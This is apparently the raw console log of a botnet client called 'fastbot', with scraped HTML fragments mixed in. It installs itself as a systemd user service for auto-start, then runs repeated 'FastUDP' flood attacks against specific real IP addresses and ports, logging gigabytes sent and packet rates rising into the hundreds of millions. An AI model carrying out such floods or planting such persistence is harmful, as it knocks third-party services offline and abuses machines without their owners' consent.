Created symlink /home/runner/.config/systemd/user/default.target.wants/fastbot.service → /home/runner/.config/systemd/user/fastbot.service.
[+] Auto-start installed via systemd: /home/runner/.config/systemd/user/fastbot.service
[+] Use 'systemctl --user start fastbot.service' to start manually
<div style="padding:5px; margin:auto; background-color:#fff"><b>2 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>2 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>2 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>2 visitors online</b></div>[+] Starting FastUDP attack: 161.123.220.236:22
[UDP] Sent: 0 KB, Approx PPS: 6
[UDP] Sent: 55431 KB, Approx PPS: 443450
[UDP] Sent: 118073 KB, Approx PPS: 944590
[UDP] Sent: 188368 KB, Approx PPS: 1.50694e+06
[UDP] Sent: 259108 KB, Approx PPS: 2.07287e+06
[UDP] Sent: 331409 KB, Approx PPS: 2.65128e+06
[UDP] Sent: 402122 KB, Approx PPS: 3.21698e+06
[UDP] Sent: 473641 KB, Approx PPS: 3.78914e+06
[UDP] Sent: 549412 KB, Approx PPS: 4.3953e+06
[UDP] Sent: 624308 KB, Approx PPS: 4.99447e+06
[UDP] Sent: 697107 KB, Approx PPS: 5.57686e+06
[UDP] Sent: 772143 KB, Approx PPS: 6.17715e+06
[UDP] Sent: 846204 KB, Approx PPS: 6.76963e+06
[UDP] Sent: 923863 KB, Approx PPS: 7.39091e+06
[UDP] Sent: 994076 KB, Approx PPS: 7.95261e+06
[UDP] Sent: 1068900 KB, Approx PPS: 8.5512e+06
[UDP] Sent: 1143224 KB, Approx PPS: 9.14579e+06
[UDP] Sent: 1219392 KB, Approx PPS: 9.75514e+06
[UDP] Sent: 1297687 KB, Approx PPS: 1.03815e+07
[UDP] Sent: 1373342 KB, Approx PPS: 1.09867e+07
[UDP] Sent: 1450973 KB, Approx PPS: 1.16078e+07
[UDP] Sent: 1528670 KB, Approx PPS: 1.22294e+07
[UDP] Sent: 1604649 KB, Approx PPS: 1.28372e+07
[UDP] Sent: 1683757 KB, Approx PPS: 1.34701e+07
[UDP] Sent: 1764448 KB, Approx PPS: 1.41156e+07
[UDP] Sent: 1843617 KB, Approx PPS: 1.47489e+07
[UDP] Sent: 1924609 KB, Approx PPS: 1.53969e+07
[UDP] Sent: 2000529 KB, Approx PPS: 1.60042e+07
[UDP] Sent: 2076202 KB, Approx PPS: 1.66096e+07
[UDP] Sent: 2155940 KB, Approx PPS: 1.72475e+07
[UDP] Sent: 2236112 KB, Approx PPS: 1.78889e+07
[UDP] Sent: 2313804 KB, Approx PPS: 1.85104e+07
[UDP] Sent: 2399075 KB, Approx PPS: 1.91926e+07
[UDP] Sent: 2477417 KB, Approx PPS: 1.98193e+07
[UDP] Sent: 2557092 KB, Approx PPS: 2.04567e+07
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 2637693 KB, Approx PPS: 2.11016e+07
[UDP] Sent: 2717682 KB, Approx PPS: 2.17415e+07
[UDP] Sent: 2796647 KB, Approx PPS: 2.23732e+07
[UDP] Sent: 2878333 KB, Approx PPS: 2.30267e+07
[UDP] Sent: 2950333 KB, Approx PPS: 2.36027e+07
[UDP] Sent: 3024022 KB, Approx PPS: 2.41922e+07
[UDP] Sent: 3098139 KB, Approx PPS: 2.47851e+07
[UDP] Sent: 3173444 KB, Approx PPS: 2.53876e+07
[UDP] Sent: 3265857 KB, Approx PPS: 2.61269e+07
[UDP] Sent: 3342576 KB, Approx PPS: 2.67406e+07
[UDP] Sent: 3419915 KB, Approx PPS: 2.73593e+07
[UDP] Sent: 3495438 KB, Approx PPS: 2.79635e+07
[UDP] Sent: 3574420 KB, Approx PPS: 2.85954e+07
[UDP] Sent: 3655328 KB, Approx PPS: 2.92426e+07
[UDP] Sent: 3738622 KB, Approx PPS: 2.9909e+07
[UDP] Sent: 3814954 KB, Approx PPS: 3.05196e+07
[UDP] Sent: 3893812 KB, Approx PPS: 3.11505e+07
[UDP] Sent: 3969927 KB, Approx PPS: 3.17594e+07
[UDP] Sent: 4046383 KB, Approx PPS: 3.23711e+07
[UDP] Sent: 4123270 KB, Approx PPS: 3.29862e+07
[UDP] Sent: 4200225 KB, Approx PPS: 3.36018e+07
[UDP] Sent: 4280365 KB, Approx PPS: 3.42429e+07
[UDP] Sent: 4356496 KB, Approx PPS: 3.4852e+07
[UDP] Sent: 4436473 KB, Approx PPS: 3.54918e+07
[UDP] Sent: 4511405 KB, Approx PPS: 3.60912e+07
[UDP] Sent: 4589522 KB, Approx PPS: 3.67162e+07
[UDP] Sent: 4660974 KB, Approx PPS: 3.72878e+07
[UDP] Sent: 4737741 KB, Approx PPS: 3.79019e+07
[UDP] Sent: 4818326 KB, Approx PPS: 3.85466e+07
[UDP] Sent: 4898770 KB, Approx PPS: 3.91902e+07
[UDP] Sent: 4974384 KB, Approx PPS: 3.97951e+07
[UDP] Sent: 5051872 KB, Approx PPS: 4.0415e+07
[UDP] Sent: 5131328 KB, Approx PPS: 4.10506e+07
[-] STOP signal received
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[+] Starting FastUDP attack: 216.202.200.164:80
[UDP] Sent: 3 KB, Approx PPS: 26
[UDP] Sent: 52498 KB, Approx PPS: 419989
[UDP] Sent: 110946 KB, Approx PPS: 887573
[UDP] Sent: 178680 KB, Approx PPS: 1.42944e+06
[UDP] Sent: 257380 KB, Approx PPS: 2.05905e+06
[UDP] Sent: 319065 KB, Approx PPS: 2.55252e+06
[UDP] Sent: 380228 KB, Approx PPS: 3.04182e+06
[UDP] Sent: 445842 KB, Approx PPS: 3.56674e+06
[UDP] Sent: 508545 KB, Approx PPS: 4.06837e+06
[UDP] Sent: 576575 KB, Approx PPS: 4.6126e+06
[UDP] Sent: 643176 KB, Approx PPS: 5.14541e+06
[UDP] Sent: 710039 KB, Approx PPS: 5.68031e+06
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 778708 KB, Approx PPS: 6.22966e+06
[UDP] Sent: 836766 KB, Approx PPS: 6.69413e+06
[UDP] Sent: 902690 KB, Approx PPS: 7.22152e+06
[UDP] Sent: 971396 KB, Approx PPS: 7.77117e+06
[UDP] Sent: 1040222 KB, Approx PPS: 8.32178e+06
[UDP] Sent: 1109462 KB, Approx PPS: 8.8757e+06
[UDP] Sent: 1183759 KB, Approx PPS: 9.47007e+06
[UDP] Sent: 1252448 KB, Approx PPS: 1.00196e+07
[UDP] Sent: 1343010 KB, Approx PPS: 1.07441e+07
[UDP] Sent: 1408858 KB, Approx PPS: 1.12709e+07
[UDP] Sent: 1477722 KB, Approx PPS: 1.18218e+07
[UDP] Sent: 1551155 KB, Approx PPS: 1.24092e+07
[UDP] Sent: 1624739 KB, Approx PPS: 1.29979e+07
[UDP] Sent: 1688795 KB, Approx PPS: 1.35104e+07
[UDP] Sent: 1753585 KB, Approx PPS: 1.40287e+07
[UDP] Sent: 1822222 KB, Approx PPS: 1.45778e+07
[UDP] Sent: 1892260 KB, Approx PPS: 1.51381e+07
[UDP] Sent: 1962768 KB, Approx PPS: 1.57021e+07
[UDP] Sent: 2034124 KB, Approx PPS: 1.6273e+07
[UDP] Sent: 2105030 KB, Approx PPS: 1.68402e+07
[UDP] Sent: 2173219 KB, Approx PPS: 1.73858e+07
[UDP] Sent: 2251684 KB, Approx PPS: 1.80135e+07
[UDP] Sent: 2325098 KB, Approx PPS: 1.86008e+07
[UDP] Sent: 2395400 KB, Approx PPS: 1.91632e+07
[UDP] Sent: 2462940 KB, Approx PPS: 1.97035e+07
[UDP] Sent: 2532347 KB, Approx PPS: 2.02588e+07
[UDP] Sent: 2597739 KB, Approx PPS: 2.07819e+07
[UDP] Sent: 2667560 KB, Approx PPS: 2.13405e+07
[UDP] Sent: 2734270 KB, Approx PPS: 2.18742e+07
[UDP] Sent: 2804012 KB, Approx PPS: 2.24321e+07
[UDP] Sent: 2880080 KB, Approx PPS: 2.30406e+07
[UDP] Sent: 2944892 KB, Approx PPS: 2.35591e+07
[UDP] Sent: 3018466 KB, Approx PPS: 2.41477e+07
[UDP] Sent: 3088275 KB, Approx PPS: 2.47062e+07
[UDP] Sent: 3155587 KB, Approx PPS: 2.52447e+07
[UDP] Sent: 3237411 KB, Approx PPS: 2.58993e+07
[UDP] Sent: 3319797 KB, Approx PPS: 2.65584e+07
[UDP] Sent: 3398879 KB, Approx PPS: 2.7191e+07
[UDP] Sent: 3475062 KB, Approx PPS: 2.78005e+07
[UDP] Sent: 3545620 KB, Approx PPS: 2.8365e+07
[UDP] Sent: 3613818 KB, Approx PPS: 2.89106e+07
[UDP] Sent: 3690910 KB, Approx PPS: 2.95273e+07
[UDP] Sent: 3768914 KB, Approx PPS: 3.01513e+07
[UDP] Sent: 3843479 KB, Approx PPS: 3.07478e+07
[-] STOP signal received
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>4 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>4 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>4 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>4 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>4 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div><div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[+] Starting FastUDP attack: 216.202.200.164:80
[UDP] Sent: 3 KB, Approx PPS: 24
[UDP] Sent: 82833 KB, Approx PPS: 662667
[UDP] Sent: 172877 KB, Approx PPS: 1.38302e+06
[UDP] Sent: 266174 KB, Approx PPS: 2.12939e+06
[UDP] Sent: 357827 KB, Approx PPS: 2.86262e+06
[UDP] Sent: 449058 KB, Approx PPS: 3.59247e+06
[UDP] Sent: 542416 KB, Approx PPS: 4.33933e+06
[UDP] Sent: 632428 KB, Approx PPS: 5.05943e+06
[UDP] Sent: 724376 KB, Approx PPS: 5.79501e+06
[UDP] Sent: 817510 KB, Approx PPS: 6.54008e+06
[UDP] Sent: 911788 KB, Approx PPS: 7.29431e+06
[UDP] Sent: 1001885 KB, Approx PPS: 8.01508e+06
[UDP] Sent: 1093884 KB, Approx PPS: 8.75107e+06
[UDP] Sent: 1187480 KB, Approx PPS: 9.49984e+06
[UDP] Sent: 1280384 KB, Approx PPS: 1.02431e+07
[UDP] Sent: 1373260 KB, Approx PPS: 1.09861e+07
[UDP] Sent: 1468364 KB, Approx PPS: 1.17469e+07
[UDP] Sent: 1561148 KB, Approx PPS: 1.24892e+07
[UDP] Sent: 1654911 KB, Approx PPS: 1.32393e+07
[UDP] Sent: 1749701 KB, Approx PPS: 1.39976e+07
[UDP] Sent: 1844490 KB, Approx PPS: 1.47559e+07
[UDP] Sent: 1939515 KB, Approx PPS: 1.55161e+07
[UDP] Sent: 2044610 KB, Approx PPS: 1.63569e+07
[UDP] Sent: 2133406 KB, Approx PPS: 1.70672e+07
[UDP] Sent: 2232362 KB, Approx PPS: 1.78589e+07
[UDP] Sent: 2349542 KB, Approx PPS: 1.87963e+07
[UDP] Sent: 2442858 KB, Approx PPS: 1.95429e+07
[UDP] Sent: 2537564 KB, Approx PPS: 2.03005e+07
[UDP] Sent: 2628734 KB, Approx PPS: 2.10299e+07
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 2724763 KB, Approx PPS: 2.17981e+07
[UDP] Sent: 2819333 KB, Approx PPS: 2.25547e+07
[UDP] Sent: 2908205 KB, Approx PPS: 2.32656e+07
[UDP] Sent: 3001003 KB, Approx PPS: 2.4008e+07
[UDP] Sent: 3096230 KB, Approx PPS: 2.47698e+07
[UDP] Sent: 3190453 KB, Approx PPS: 2.55236e+07
[UDP] Sent: 3290679 KB, Approx PPS: 2.63254e+07
[UDP] Sent: 3384619 KB, Approx PPS: 2.7077e+07
[UDP] Sent: 3477704 KB, Approx PPS: 2.78216e+07
[UDP] Sent: 3571527 KB, Approx PPS: 2.85722e+07
[UDP] Sent: 3661872 KB, Approx PPS: 2.9295e+07
[UDP] Sent: 3762111 KB, Approx PPS: 3.00969e+07
[UDP] Sent: 3857442 KB, Approx PPS: 3.08595e+07
[UDP] Sent: 3950285 KB, Approx PPS: 3.16023e+07
[UDP] Sent: 4042994 KB, Approx PPS: 3.2344e+07
[UDP] Sent: 4138075 KB, Approx PPS: 3.31046e+07
[UDP] Sent: 4233705 KB, Approx PPS: 3.38696e+07
[UDP] Sent: 4328930 KB, Approx PPS: 3.46314e+07
[UDP] Sent: 4421291 KB, Approx PPS: 3.53703e+07
[UDP] Sent: 4517062 KB, Approx PPS: 3.61365e+07
[UDP] Sent: 4607787 KB, Approx PPS: 3.68623e+07
[UDP] Sent: 4707744 KB, Approx PPS: 3.7662e+07
[UDP] Sent: 4804079 KB, Approx PPS: 3.84326e+07
[UDP] Sent: 4896606 KB, Approx PPS: 3.91728e+07
[UDP] Sent: 4990586 KB, Approx PPS: 3.99247e+07
[UDP] Sent: 5084915 KB, Approx PPS: 4.06793e+07
[UDP] Sent: 5186996 KB, Approx PPS: 4.1496e+07
[UDP] Sent: 5284304 KB, Approx PPS: 4.22744e+07
[UDP] Sent: 5369224 KB, Approx PPS: 4.29538e+07
[UDP] Sent: 5448763 KB, Approx PPS: 4.35901e+07
[UDP] Sent: 5539283 KB, Approx PPS: 4.43143e+07
[UDP] Sent: 5629216 KB, Approx PPS: 4.50337e+07
[UDP] Sent: 5720918 KB, Approx PPS: 4.57673e+07
[UDP] Sent: 5812016 KB, Approx PPS: 4.64961e+07
[UDP] Sent: 5902600 KB, Approx PPS: 4.72208e+07
[UDP] Sent: 5998460 KB, Approx PPS: 4.79877e+07
[UDP] Sent: 6082639 KB, Approx PPS: 4.86611e+07
[UDP] Sent: 6170398 KB, Approx PPS: 4.93632e+07
[UDP] Sent: 6266407 KB, Approx PPS: 5.01313e+07
[UDP] Sent: 6361841 KB, Approx PPS: 5.08947e+07
[UDP] Sent: 6458442 KB, Approx PPS: 5.16675e+07
[UDP] Sent: 6553146 KB, Approx PPS: 5.24252e+07
[UDP] Sent: 6646724 KB, Approx PPS: 5.31738e+07
[UDP] Sent: 6736246 KB, Approx PPS: 5.389e+07
[UDP] Sent: 6831750 KB, Approx PPS: 5.4654e+07
[UDP] Sent: 6934852 KB, Approx PPS: 5.54788e+07
[UDP] Sent: 7038118 KB, Approx PPS: 5.63049e+07
[UDP] Sent: 7135488 KB, Approx PPS: 5.70839e+07
[UDP] Sent: 7227441 KB, Approx PPS: 5.78195e+07
[UDP] Sent: 7320805 KB, Approx PPS: 5.85664e+07
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 7432271 KB, Approx PPS: 5.94582e+07
[UDP] Sent: 7526539 KB, Approx PPS: 6.02123e+07
[UDP] Sent: 7614315 KB, Approx PPS: 6.09145e+07
[UDP] Sent: 7700785 KB, Approx PPS: 6.16063e+07
[UDP] Sent: 7796077 KB, Approx PPS: 6.23686e+07
[UDP] Sent: 7901391 KB, Approx PPS: 6.32111e+07
[UDP] Sent: 7972206 KB, Approx PPS: 6.37776e+07
[UDP] Sent: 8056789 KB, Approx PPS: 6.44543e+07
[UDP] Sent: 8151024 KB, Approx PPS: 6.52082e+07
[UDP] Sent: 8238389 KB, Approx PPS: 6.59071e+07
[UDP] Sent: 8323088 KB, Approx PPS: 6.65847e+07
[UDP] Sent: 8425903 KB, Approx PPS: 6.74072e+07
[UDP] Sent: 8520703 KB, Approx PPS: 6.81656e+07
[UDP] Sent: 8614996 KB, Approx PPS: 6.892e+07
[UDP] Sent: 8706867 KB, Approx PPS: 6.96549e+07
[UDP] Sent: 8802021 KB, Approx PPS: 7.04162e+07
[UDP] Sent: 8897780 KB, Approx PPS: 7.11822e+07
[UDP] Sent: 8991544 KB, Approx PPS: 7.19324e+07
[UDP] Sent: 9085239 KB, Approx PPS: 7.26819e+07
[UDP] Sent: 9168661 KB, Approx PPS: 7.33493e+07
[UDP] Sent: 9257705 KB, Approx PPS: 7.40616e+07
[UDP] Sent: 9344431 KB, Approx PPS: 7.47555e+07
[UDP] Sent: 9435889 KB, Approx PPS: 7.54871e+07
[UDP] Sent: 9531103 KB, Approx PPS: 7.62488e+07
[UDP] Sent: 9627119 KB, Approx PPS: 7.7017e+07
[UDP] Sent: 9722468 KB, Approx PPS: 7.77797e+07
[UDP] Sent: 9818064 KB, Approx PPS: 7.85445e+07
[UDP] Sent: 9909410 KB, Approx PPS: 7.92753e+07
[UDP] Sent: 10002389 KB, Approx PPS: 8.00191e+07
[UDP] Sent: 10096635 KB, Approx PPS: 8.07731e+07
[UDP] Sent: 10188629 KB, Approx PPS: 8.1509e+07
[UDP] Sent: 10284745 KB, Approx PPS: 8.2278e+07
[UDP] Sent: 10380046 KB, Approx PPS: 8.30404e+07
[UDP] Sent: 10473334 KB, Approx PPS: 8.37867e+07
[UDP] Sent: 10568949 KB, Approx PPS: 8.45516e+07
[UDP] Sent: 10664273 KB, Approx PPS: 8.53142e+07
[UDP] Sent: 10757088 KB, Approx PPS: 8.60567e+07
[UDP] Sent: 10851744 KB, Approx PPS: 8.6814e+07
[UDP] Sent: 10956241 KB, Approx PPS: 8.76499e+07
[UDP] Sent: 11051206 KB, Approx PPS: 8.84097e+07
[UDP] Sent: 11149053 KB, Approx PPS: 8.91924e+07
[UDP] Sent: 11244032 KB, Approx PPS: 8.99523e+07
[UDP] Sent: 11337130 KB, Approx PPS: 9.0697e+07
[UDP] Sent: 11428008 KB, Approx PPS: 9.14241e+07
[UDP] Sent: 11519808 KB, Approx PPS: 9.21585e+07
[UDP] Sent: 11611740 KB, Approx PPS: 9.28939e+07
[UDP] Sent: 11701680 KB, Approx PPS: 9.36134e+07
[UDP] Sent: 11801336 KB, Approx PPS: 9.44107e+07
[UDP] Sent: 11895738 KB, Approx PPS: 9.51659e+07
[UDP] Sent: 11989437 KB, Approx PPS: 9.59155e+07
[UDP] Sent: 12084120 KB, Approx PPS: 9.6673e+07
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 12175223 KB, Approx PPS: 9.74018e+07
[UDP] Sent: 12269831 KB, Approx PPS: 9.81587e+07
[UDP] Sent: 12368358 KB, Approx PPS: 9.89469e+07
[UDP] Sent: 12460028 KB, Approx PPS: 9.96802e+07
[UDP] Sent: 12553795 KB, Approx PPS: 1.0043e+08
[UDP] Sent: 12646605 KB, Approx PPS: 1.01173e+08
[UDP] Sent: 12733401 KB, Approx PPS: 1.01867e+08
[UDP] Sent: 12828330 KB, Approx PPS: 1.02627e+08
[UDP] Sent: 12920855 KB, Approx PPS: 1.03367e+08
[UDP] Sent: 13010640 KB, Approx PPS: 1.04085e+08
[UDP] Sent: 13106429 KB, Approx PPS: 1.04851e+08
[UDP] Sent: 13198070 KB, Approx PPS: 1.05585e+08
[UDP] Sent: 13281784 KB, Approx PPS: 1.06254e+08
[UDP] Sent: 13376154 KB, Approx PPS: 1.07009e+08
[UDP] Sent: 13467972 KB, Approx PPS: 1.07744e+08
[UDP] Sent: 13552423 KB, Approx PPS: 1.08419e+08
[UDP] Sent: 13639066 KB, Approx PPS: 1.09113e+08
[UDP] Sent: 13720924 KB, Approx PPS: 1.09767e+08
[UDP] Sent: 13806412 KB, Approx PPS: 1.10451e+08
[UDP] Sent: 13898960 KB, Approx PPS: 1.11192e+08
[UDP] Sent: 14015933 KB, Approx PPS: 1.12127e+08
[UDP] Sent: 14106312 KB, Approx PPS: 1.12851e+08
[UDP] Sent: 14194095 KB, Approx PPS: 1.13553e+08
[UDP] Sent: 14274649 KB, Approx PPS: 1.14197e+08
[UDP] Sent: 14350236 KB, Approx PPS: 1.14802e+08
[UDP] Sent: 14438106 KB, Approx PPS: 1.15505e+08
[UDP] Sent: 14541543 KB, Approx PPS: 1.16332e+08
[UDP] Sent: 14626267 KB, Approx PPS: 1.1701e+08
[UDP] Sent: 14714822 KB, Approx PPS: 1.17719e+08
[UDP] Sent: 14795441 KB, Approx PPS: 1.18364e+08
[UDP] Sent: 14890603 KB, Approx PPS: 1.19125e+08
[UDP] Sent: 14981133 KB, Approx PPS: 1.19849e+08
[UDP] Sent: 15060449 KB, Approx PPS: 1.20484e+08
[UDP] Sent: 15150184 KB, Approx PPS: 1.21201e+08
[UDP] Sent: 15241082 KB, Approx PPS: 1.21929e+08
[UDP] Sent: 15322363 KB, Approx PPS: 1.22579e+08
[UDP] Sent: 15415556 KB, Approx PPS: 1.23324e+08
[UDP] Sent: 15501299 KB, Approx PPS: 1.2401e+08
[UDP] Sent: 15585696 KB, Approx PPS: 1.24686e+08
[UDP] Sent: 15677943 KB, Approx PPS: 1.25424e+08
[UDP] Sent: 15769277 KB, Approx PPS: 1.26154e+08
[UDP] Sent: 15874074 KB, Approx PPS: 1.26993e+08
[UDP] Sent: 15968959 KB, Approx PPS: 1.27752e+08
[UDP] Sent: 16062920 KB, Approx PPS: 1.28503e+08
[UDP] Sent: 16141021 KB, Approx PPS: 1.29128e+08
[UDP] Sent: 16226895 KB, Approx PPS: 1.29815e+08
[UDP] Sent: 16322812 KB, Approx PPS: 1.30583e+08
[UDP] Sent: 16410531 KB, Approx PPS: 1.31284e+08
[UDP] Sent: 16502845 KB, Approx PPS: 1.32023e+08
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 16597352 KB, Approx PPS: 1.32779e+08
[UDP] Sent: 16691757 KB, Approx PPS: 1.33534e+08
[UDP] Sent: 16786362 KB, Approx PPS: 1.34291e+08
[UDP] Sent: 16881864 KB, Approx PPS: 1.35055e+08
[UDP] Sent: 16970463 KB, Approx PPS: 1.35764e+08
[UDP] Sent: 17063226 KB, Approx PPS: 1.36506e+08
[UDP] Sent: 17159323 KB, Approx PPS: 1.37275e+08
[UDP] Sent: 17247969 KB, Approx PPS: 1.37984e+08
[UDP] Sent: 17339445 KB, Approx PPS: 1.38716e+08
[UDP] Sent: 17436731 KB, Approx PPS: 1.39494e+08
[UDP] Sent: 17524168 KB, Approx PPS: 1.40193e+08
[UDP] Sent: 17611325 KB, Approx PPS: 1.40891e+08
[UDP] Sent: 17698454 KB, Approx PPS: 1.41588e+08
[UDP] Sent: 17789808 KB, Approx PPS: 1.42318e+08
[UDP] Sent: 17875546 KB, Approx PPS: 1.43004e+08
[UDP] Sent: 17961957 KB, Approx PPS: 1.43696e+08
[UDP] Sent: 18049198 KB, Approx PPS: 1.44394e+08
[UDP] Sent: 18135747 KB, Approx PPS: 1.45086e+08
[UDP] Sent: 18222091 KB, Approx PPS: 1.45777e+08
[UDP] Sent: 18315199 KB, Approx PPS: 1.46522e+08
[UDP] Sent: 18407649 KB, Approx PPS: 1.47261e+08
[UDP] Sent: 18493872 KB, Approx PPS: 1.47951e+08
[-] STOP signal received
[+] Starting FastUDP attack: 216.202.200.164:80
[UDP] Sent: 4 KB, Approx PPS: 36
[UDP] Sent: 78117 KB, Approx PPS: 624939
[UDP] Sent: 157915 KB, Approx PPS: 1.26332e+06
[UDP] Sent: 243116 KB, Approx PPS: 1.94493e+06
[UDP] Sent: 324774 KB, Approx PPS: 2.5982e+06
[UDP] Sent: 405767 KB, Approx PPS: 3.24614e+06
[UDP] Sent: 494380 KB, Approx PPS: 3.95504e+06
[UDP] Sent: 585823 KB, Approx PPS: 4.68659e+06
[UDP] Sent: 663156 KB, Approx PPS: 5.30525e+06
[UDP] Sent: 742166 KB, Approx PPS: 5.93733e+06
[UDP] Sent: 819646 KB, Approx PPS: 6.55717e+06
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 900647 KB, Approx PPS: 7.20518e+06
[UDP] Sent: 977448 KB, Approx PPS: 7.81959e+06
[UDP] Sent: 1056025 KB, Approx PPS: 8.44821e+06
[UDP] Sent: 1132241 KB, Approx PPS: 9.05793e+06
[UDP] Sent: 1212440 KB, Approx PPS: 9.69952e+06
[UDP] Sent: 1295430 KB, Approx PPS: 1.03634e+07
[UDP] Sent: 1374156 KB, Approx PPS: 1.09933e+07
[UDP] Sent: 1444661 KB, Approx PPS: 1.15573e+07
[UDP] Sent: 1528008 KB, Approx PPS: 1.22241e+07
[UDP] Sent: 1610122 KB, Approx PPS: 1.2881e+07
[UDP] Sent: 1688564 KB, Approx PPS: 1.35085e+07
[UDP] Sent: 1772725 KB, Approx PPS: 1.41818e+07
[UDP] Sent: 1850399 KB, Approx PPS: 1.48032e+07
[UDP] Sent: 2235300 KB, Approx PPS: 1.78824e+07
[UDP] Sent: 2326257 KB, Approx PPS: 1.86101e+07
[UDP] Sent: 2402056 KB, Approx PPS: 1.92164e+07
[UDP] Sent: 2474691 KB, Approx PPS: 1.97975e+07
[UDP] Sent: 2545787 KB, Approx PPS: 2.03663e+07
[UDP] Sent: 2617500 KB, Approx PPS: 2.094e+07
[UDP] Sent: 2687946 KB, Approx PPS: 2.15036e+07
[UDP] Sent: 2761010 KB, Approx PPS: 2.20881e+07
[UDP] Sent: 2833572 KB, Approx PPS: 2.26686e+07
[UDP] Sent: 2913489 KB, Approx PPS: 2.33079e+07
[UDP] Sent: 2998175 KB, Approx PPS: 2.39854e+07
[UDP] Sent: 3078062 KB, Approx PPS: 2.46245e+07
[UDP] Sent: 3137886 KB, Approx PPS: 2.51031e+07
[UDP] Sent: 3206489 KB, Approx PPS: 2.56519e+07
[UDP] Sent: 3287101 KB, Approx PPS: 2.62968e+07
[UDP] Sent: 3360690 KB, Approx PPS: 2.68855e+07
[UDP] Sent: 3434757 KB, Approx PPS: 2.74781e+07
[UDP] Sent: 3511063 KB, Approx PPS: 2.80885e+07
[UDP] Sent: 3583099 KB, Approx PPS: 2.86648e+07
[UDP] Sent: 3663071 KB, Approx PPS: 2.93046e+07
[UDP] Sent: 3738251 KB, Approx PPS: 2.9906e+07
[UDP] Sent: 3814248 KB, Approx PPS: 3.0514e+07
[UDP] Sent: 3911015 KB, Approx PPS: 3.12881e+07
[UDP] Sent: 3985926 KB, Approx PPS: 3.18874e+07
[UDP] Sent: 4094594 KB, Approx PPS: 3.27568e+07
[UDP] Sent: 4172314 KB, Approx PPS: 3.33785e+07
[UDP] Sent: 4248843 KB, Approx PPS: 3.39908e+07
[UDP] Sent: 4323572 KB, Approx PPS: 3.45886e+07
[UDP] Sent: 4403544 KB, Approx PPS: 3.52284e+07
[UDP] Sent: 4480948 KB, Approx PPS: 3.58476e+07
[UDP] Sent: 4555457 KB, Approx PPS: 3.64437e+07
[UDP] Sent: 4630782 KB, Approx PPS: 3.70463e+07
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[UDP] Sent: 4700298 KB, Approx PPS: 3.76024e+07
[UDP] Sent: 4772552 KB, Approx PPS: 3.81804e+07
[UDP] Sent: 4859824 KB, Approx PPS: 3.88786e+07
[UDP] Sent: 4940255 KB, Approx PPS: 3.9522e+07
[UDP] Sent: 5021496 KB, Approx PPS: 4.0172e+07
[UDP] Sent: 5101036 KB, Approx PPS: 4.08083e+07
[UDP] Sent: 5173997 KB, Approx PPS: 4.1392e+07
[UDP] Sent: 5255729 KB, Approx PPS: 4.20458e+07
[UDP] Sent: 5336650 KB, Approx PPS: 4.26932e+07
[-] STOP signal received
<div style="padding:5px; margin:auto; background-color:#fff"><b>3 visitors online</b></div>[+] Starting FastUDP attack: 216.202.200.164:80
[UDP] Sent: 2 KB, Approx PPS: 19
[UDP] Sent: 81258 KB, Approx PPS: 650064
[UDP] Sent: 154903 KB, Approx PPS: 1.23923e+06
[UDP] Sent: 242878 KB, Approx PPS: 1.94302e+06
[UDP] Sent: 315782 KB, Approx PPS: 2.52626e+06
[UDP] Sent: 395744 KB, Approx PPS: 3.16596e+06
[UDP] Sent: 472288 KB, Approx PPS: 3.77831e+06
[UDP] Sent: 550418 KB, Approx PPS: 4.40335e+06
[UDP] Sent: 630836 KB, Approx PPS: 5.04669e+06
[UDP] Sent: 714901 KB, Approx PPS: 5.71921e+06
[UDP] Sent: 823445 KB, Approx PPS: 6.58756e+06
[UDP] Sent: 899968 KB, Approx PPS: 7.19975e+06
[UDP] Sent: 978915 KB, Approx PPS: 7.83132e+06
[UDP] Sent: 1063198 KB, Approx PPS: 8.50559e+06
[UDP] Sent: 1142691 KB, Approx PPS: 9.14153e+06
[UDP] Sent: 1222769 KB, Approx PPS: 9.78216e+06
[UDP] Sent: 1304081 KB, Approx PPS: 1.04326e+07
[UDP] Sent: 1388373 KB, Approx PPS: 1.1107e+07
